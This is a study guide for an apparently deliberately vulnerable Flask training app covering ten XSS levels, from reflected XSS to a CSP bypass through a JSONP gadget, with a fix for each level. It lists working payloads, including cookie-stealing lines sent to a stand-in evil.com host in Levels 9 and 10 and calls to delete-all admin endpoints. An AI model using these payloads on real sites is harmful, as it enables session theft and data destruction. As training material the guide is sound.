# XSS Dojo - Complete XSS Vulnerability Study Guide

## Overview

This educational web application contains **10 progressive XSS vulnerability challenges** designed to help students understand Cross-Site Scripting (XSS) attacks, from basic reflected XSS to advanced Content Security Policy (CSP) bypasses. Each level demonstrates a different type of XSS vulnerability with various security controls that can be bypassed.

**Application Details:**
- **Framework**: Flask (Python)
- **Theme**: Blue holographic cyber range interface
- **Database**: In-memory SQLite for stored XSS challenges
- **Port**: 1112
- **Access**: `http://localhost:1112`

---

## How to Use This Guide

1. **Start the Application**: `python vuln_xss.py`
2. **Navigate** through levels 1-10 in order
3. **Read** each vulnerability description
4. **Try the suggested payloads** to understand the attack
5. **Study the source code** to see how the vulnerability works
6. **Learn the remediation** strategies to prevent similar attacks

---

## Level-by-Level Vulnerability Analysis

### Level 1: Reflected XSS (No Filter) 🔴 Easy

**URL**: `http://localhost/level1?q=<script>alert(1)</script>`

**Vulnerability Type**: Reflected XSS

**Code Location**: `vuln_xss.py:186-204`

**How it Works**:
```python
query = request.args.get('q', '')
# Direct reflection without ANY filtering
<span class="text-cyan-300">{query}</span>
```

**Attack Flow**:
1. User clicks malicious link: `/level1?q=<script>alert(1)</script>`
2. Server extracts `q` parameter
3. Server reflects `query` directly into HTML
4. Browser executes the script

**Successful Payloads**:
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`

**Impact**: Can steal cookies, redirect users, perform actions on their behalf.

**Remediation**:
```python
from markupsafe import escape
safe_query = escape(query)
<span class="text-cyan-300">{safe_query}</span>
```

---

### Level 2: Stored XSS (Persistence) 🟡 Medium

**URL**: `http://localhost/level2`

**Vulnerability Type**: Stored XSS

**Code Location**: `vuln_xss.py:207-243`

**How it Works**:
```python
# VULN: No sanitization before database storage
c.execute("INSERT INTO comments (content) VALUES (?)", (comment,))

# VULN: Direct rendering from database
comments_html = "".join([f'<div class="...">{row[0]}</div>' for row in comments])
```

**Attack Flow**:
1. Attacker submits malicious comment via form
2. Malicious code is stored in SQLite database
3. Every user who visits the page executes the script
4. Attack persists across sessions and users

**Successful Payloads**:
- `<script>alert(document.domain)</script>`
- `<img src=x onerror=fetch('/steal?cookies='+document.cookie)>`
- `<svg onload=fetch('/api/admin/delete-all')>`

**Impact**: Persistent attacks affecting all users, potential site-wide compromise.

**Remediation**:
```python
import html
# Store escaped content
safe_comment = html.escape(comment)
c.execute("INSERT INTO comments (content) VALUES (?)", (safe_comment,))
```

---

### Level 3: DOM-Based XSS (Fragment) 🟡 Medium

**URL**: `http://localhost/level3#<img src=x onerror=alert(1)>`

**Vulnerability Type**: DOM-based XSS

**Code Location**: `vuln_xss.py:258-270`

**How it Works**:
```javascript
// VULN: Hash fragment assigned to innerHTML
var hash = decodeURIComponent(window.location.hash.substring(1));
display.innerHTML = "Signal Received: " + hash;
```

**Key Characteristic**: **Server never sees the payload!**

**Attack Flow**:
1. Attacker crafts URL with malicious fragment
2. Victim visits the URL
3. Client-side JavaScript reads `window.location.hash`
4. JavaScript assigns hash to `innerHTML`
5. Browser executes the malicious code

**Successful Payloads**:
- `#<img src=x onerror=alert(1)>`
- `#<svg onload=alert(1)>`
- `#<script>alert(1)</script>`

**Impact**: Bypasses server-side filtering, difficult to detect in logs.

**Remediation**:
```javascript
// Use textContent instead of innerHTML
display.textContent = "Signal Received: " + hash;
// Or sanitize with DOMPurify library
display.innerHTML = DOMPurify.sanitize("Signal Received: " + hash);
```

---

### Level 4: Tag Filter Bypass (No Script) 🟡 Medium

**URL**: `http://localhost/level4?q=<img src=x onerror=alert(1)>`

**Vulnerability Type**: Filter Bypass

**Code Location**: `vuln_xss.py:282-284`

**Filter Implementation**:
```python
# FILTER: Remove <script> tags (case insensitive)
safe_query = re.sub(r'(?i)<script.*?>.*?</script>', '[BLOCKED]', query)
safe_query = re.sub(r'(?i)<script', '[BLOCKED]', safe_query)
```

**Filter Weaknesses**:
- Only blocks `<script>` tags
- Allows other HTML tags with event handlers
- Case-insensitive but incomplete coverage

**Successful Bypass Payloads**:
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<iframe src=javascript:alert(1)>`
- `<body onload=alert(1)>`
- `<details open ontoggle=alert(1)>`

**Filter Evasion Techniques**:
```html
<!-- Different event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Different tags -->
<iframe src=javascript:alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Remediation**:
```python
# Allowlist approach - only allow safe characters
import re
safe_query = re.sub(r'[^\w\s.,!?-]', '', query)
# OR use proper HTML escaping
safe_query = html.escape(query)
```

---

### Level 5: Attribute Injection (Breakout) 🟠 Hard

**URL**: `http://localhost/level5?u=" autofocus onfocus="alert(1)`

**Vulnerability Type**: Attribute Injection

**Code Location**: `vuln_xss.py:310-313`

**Filter Implementation**:
```python
# FILTER: Escapes < and > but NOT quotes (")
safe_username = username.replace('<', '&lt;').replace('>', '&gt;')
```

**Vulnerable Context**:
```html
<!-- Input reflected inside value attribute -->
<input type="text" name="u" value="{safe_username}" ...>
```

**Filter Weaknesses**:
- Escapes `<` and `>` but not `"` quotes
- Prevents new tag creation but allows attribute injection
- Missing quote escaping allows breakout

**Successful Payloads**:
```html
" autofocus onfocus="alert(1)
" onmouseover="alert(1)
" type="text" onfocus="alert(1)" autofocus
```

**Attack Flow**:
1. Input: `" autofocus onfocus="alert(1)`
2. After escaping: `&quot; autofocus onfocus=&quot;alert(1)&quot;`
3. HTML becomes: `<input value="" autofocus onfocus="alert(1)">`
4. Input field gets focus automatically (autofocus)
5. JavaScript executes via onfocus event

**Remediation**:
```python
# Proper HTML escaping
safe_username = html.escape(username, quote=True)
# OR use Flask's auto-escaping with proper context
```

---

### Level 6: Protocol Injection (Href) 🟠 Hard

**URL**: `http://localhost/level6?link=javascript:alert(1)`

**Vulnerability Type**: Protocol Handler Attack

**Code Location**: `vuln_xss.py:337`

**Filter Implementation**:
```python
# FILTER: Full HTML escape (Quotes and Tags)
safe_link = html.escape(link)
```

**Vulnerable Context**:
```html
<a href="{safe_link}" class="...">
    <span>VISIT DESTINATION</span>
</a>
```

**Filter Strengths**:
- Properly escapes all HTML special characters
- Prevents attribute breakout
- Prevents HTML injection

**Filter Weaknesses**:
- Allows JavaScript protocol handler
- Doesn't validate URL schemes

**Successful Payloads**:
```
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
```

**Attack Flow**:
1. Attacker sets `link=javascript:alert(1)`
2. HTML becomes: `<a href="javascript:alert(1)">`
3. User clicks "VISIT DESTINATION" button
4. Browser executes JavaScript protocol handler

**Remediation**:
```python
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ['http', 'https', 'mailto']

safe_link = html.escape(link) if is_safe_url(link) else '#'
```

---

### Level 7: JavaScript Context String Escape 🟠 Hard

**URL**: `http://localhost/level7?p=';alert(1);'`

**Vulnerability Type**: JavaScript Injection

**Code Location**: `vuln_xss.py:370`

**Filter Implementation**:
```python
# FILTER: Prevent HTML Injection, prevent double quote breakout
safe_payload = payload.replace('<', '').replace('>', '').replace('"', '').replace('/', '')
```

**Vulnerable Context**:
```javascript
// Input assigned to JavaScript string variable
var systemStatus = '{safe_payload}';
```

**Filter Weaknesses**:
- Blocks double quotes `"` but allows single quotes `'`
- Removes forward slashes `/` but not semicolons `;`
- Focuses on HTML injection, not JavaScript context

**Successful Payloads**:
```javascript
';alert(1);'
';alert(document.domain);var x='
'-alert(1)-'
',alert(1),'
```

**Attack Flow**:
1. Input: `';alert(1);'`
2. After filtering: `';alert(1);'` (unchanged)
3. JavaScript becomes: `var systemStatus = '';alert(1);';`
4. String terminates, alert executes, new string starts

**Remediation**:
```python
import json
# JSON encoding is safer for JavaScript contexts
safe_payload = json.dumps(payload)[1:-1]  # Remove outer quotes
```

---

### Level 8: Double Encoding (WAF Bypass) 🔴 Expert

**URL**: `http://localhost/level8?q=%253Cscript%253Ealert(1)%253C/script%253E`

**Vulnerability Type**: WAF Bypass via Double Encoding

**Code Location**: `vuln_xss.py:397-406`

**WAF Implementation**:
```python
# 1. WAF CHECK (Checks on raw input)
decoded_once = urllib.parse.unquote(raw_query)

if '<script' in decoded_once.lower() or 'javascript:' in decoded_once.lower():
    return BLOCKED_PAGE
```

**Vulnerability**:
```python
# 2. VULNERABILITY: Application decodes AGAIN
final_content = urllib.parse.unquote(decoded_once)
```

**Double Encoding Process**:
1. Original: `<script>alert(1)</script>`
2. First encode: `%3Cscript%3Ealert(1)%3C/script%3E`
3. Second encode: `%253Cscript%253Ealert(1)%253C/script%253E`

**Attack Flow**:
1. WAF receives: `%253Cscript%253Ealert(1)%253C/script%253E`
2. WAF decodes once: `%3Cscript%3Ealert(1)%3C/script%3E`
3. WAF check: No `<script` found (still encoded)
4. Application decodes again: `<script>alert(1)</script>`
5. XSS executes

**Successful Payloads**:
```
%253Cscript%253Ealert(1)%253C/script%253E
%2526%2523x3C%253Bscript%2526%2523x3E%253Balert(1)%2526%2523x3C%252Fscript%2526%2523x3E%253B
%2525%2532%2535%2533%2543script%2525%2532%2535%2533%2545alert(1)%2525%2532%2535%2533%2545%2525%2532%2535%2533%2545%252Fscript%2525%2532%2535%2533%2545
```

**Remediation**:
```python
# Normalize input completely before validation
import urllib.parse
def normalize_input(input_str):
    # Keep decoding until no more changes
    decoded = input_str
    while True:
        new_decoded = urllib.parse.unquote(decoded)
        if new_decoded == decoded:
            break
        decoded = new_decoded
    return decoded

normalized = normalize_input(raw_query)
if '<script' in normalized.lower():
    return BLOCKED_PAGE
```

---

### Level 9: Client-Side Template Injection (CSTI) 🔴 Expert

**URL**: `http://localhost/level9#name={{alert(1)}}`

**Vulnerability Type**: Client-Side Template Injection

**Code Location**: `vuln_xss.py:452-454`

**Template Engine Implementation**:
```javascript
// VULN: Custom template engine using eval()
var rendered = template.replace(/{{\s*(.*?)\s*}}/g, function(match, code) {
    try { return eval(code); } catch(e) { return "ERROR"; }
});
```

**Attack Flow**:
1. URL fragment: `#name={{alert(1)}}`
2. Template string: `"Hello, " + name + "!"`
3. Pattern match: `{{alert(1)}}` found
4. Code extraction: `alert(1)`
5. `eval('alert(1)')` executes

**Successful Payloads**:
```javascript
{{alert(1)}}
{{alert(document.domain)}}
{{window.location='http://evil.com/steal?'+document.cookie}}
{{fetch('/admin/delete-all')}}
{{document.body.style='background:red'}}
```

**Advanced Payloads**:
```javascript
{{(function(){alert('Advanced CSTI');return ''})()}}
{{(()=>{alert('Arrow function CSTI');return ''})()}}
{{eval('alert("Eval injection")')}}
{{setTimeout('alert("Delayed attack")',1000)}}
```

**Remediation**:
```javascript
// Use safe template evaluation
function renderTemplate(template, data) {
    return template.replace(/{{\s*(\w+)\s*}}/g, function(match, key) {
        return data[key] || 'ERROR';
    });
}

// OR use established template libraries
// Handlebars, Mustache, Nunjucks with proper sandboxing
```

---

### Level 10: CSP Bypass (JSONP Gadget) 🔴 Expert

**URL**: `http://localhost/level10?q=<script src="/api/widgets?callback=alert(1)"></script>`

**Vulnerability Type**: CSP Bypass via JSONP Gadget

**CSP Policy**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self';">
```

**JSONP API Endpoint**:
```python
@app.route('/api/widgets')
def api_widgets():
    callback = request.args.get('callback', 'init')
    data = json.dumps({"status": "ok", "items": ["Widget A", "Widget B"]})
    return f"{callback}({data})"
```

**CSP Analysis**:
- `script-src 'self'` allows scripts from same domain
- Blocks inline scripts (`<script>alert(1)</script>`)
- Blocks external scripts (`<script src="evil.com">`)
- **Allows** JSONP callbacks from same domain

**Attack Flow**:
1. CSP blocks inline scripts
2. Attacker discovers internal JSONP API
3. Uses JSONP callback to execute JavaScript
4. CSP allows it because it's from same domain

**Successful Payloads**:
```html
<script src="/api/widgets?callback=alert(1)"></script>
<script src="/api/widgets?callback=(function(){alert('Advanced');return 'loaded';})"></script>
<script src="/api/widgets?callback=window.location='http://evil.com/?'+document.cookie"></script>
```

**JSONP Gadget Exploitation**:
```javascript
// The JSONP response becomes executable JavaScript
alert(1)({"status": "ok", "items": ["Widget A", "Widget B"]})
// This executes alert(1) and ignores the JSON data
```

**Advanced CSP Bypass**:
```javascript
// Chain multiple gadgets
<script src="/api/widgets?callback=fetch('/admin/delete').then(r=>r.text()).then(d=>alert(d))"></script>

// Use existing JavaScript functions
<script src="/api/widgets?callback=loadWidgets"></script>
<script>loadWidgets = function(data){alert(JSON.stringify(data));}</script>
```

**Remediation**:
```python
# 1. Remove JSONP endpoints if not needed
# 2. Strict CSP with nonce
csp_meta = '<meta http-equiv="Content-Security-Policy" content="script-src \'self\' \'nonce-${nonce}\';">'

# 3. Proper JSON API (no JSONP)
@app.route('/api/widgets')
def api_widgets():
    data = {"status": "ok", "items": ["Widget A", "Widget B"]}
    return jsonify(data)

# 4. Input validation on callback names
import re
if not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
    callback = 'callback'
```

---

## General XSS Prevention Strategies

### 1. Output Encoding (Context-Aware)

```python
import html
from markupsafe import escape

# HTML context
html.escape(user_input, quote=True)

# JavaScript context
json.dumps(user_input)  # For JSON serialization

# URL context
urllib.parse.quote(user_input)

# CSS context
css.escape(user_input)  # Using css.escape library
```

### 2. Content Security Policy (CSP)

```html
<!-- Strict CSP -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'none';
               script-src 'self' https://cdn.example.com;
               style-src 'self' 'unsafe-inline';
               img-src 'self' data:;
               connect-src 'self';
               font-src 'self';">
```

### 3. Input Validation

```python
import re

def validate_input(input_str, max_length=100):
    if len(input_str) > max_length:
        return False
    # Allow only alphanumeric characters and safe symbols
    if not re.match(r'^[a-zA-Z0-9\s.,!?-]+$', input_str):
        return False
    return True
```

### 4. HTTP Security Headers

```python
@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

### 5. Framework Protection

- **Flask**: Use Jinja2 auto-escaping
- **Django**: Built-in template auto-escaping
- **React**: JSX auto-escapes by default
- **Vue.js**: v-text instead of v-html when possible

---